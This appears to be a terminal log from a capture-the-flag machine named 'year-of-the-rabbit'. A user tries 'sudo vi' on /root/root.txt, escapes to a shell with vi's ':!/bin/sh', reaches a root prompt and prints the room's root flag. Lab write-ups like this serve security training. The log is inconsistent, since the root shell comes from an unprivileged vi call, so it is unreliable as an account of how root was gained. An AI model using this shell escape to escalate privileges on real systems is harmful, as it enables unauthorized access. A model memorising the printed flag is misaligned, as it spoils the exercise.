gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi /root/root.txt
[sudo] password for gwendoline:

[1]+  Stopped                 sudo /usr/bin/vi /root/root.txt
gwendoline@year-of-the-rabbit:~$ /usr/bin/vi /root/root.txt
gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi /root/root.txt
gwendoline@year-of-the-rabbit:~$ gwendoline@year-of-the-rabbit:~$ /usr/bin/vi /root/root.txt
bash: gwendoline@year-of-the-rabbit:~$: command not found
gwendoline@year-of-the-rabbit:~$ vi -c ':!/bin/sh'
root@year-of-the-rabbit:/home/gwendoline# ls
user.txt
root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
root@year-of-the-rabbit:/home/gwendoline#
```


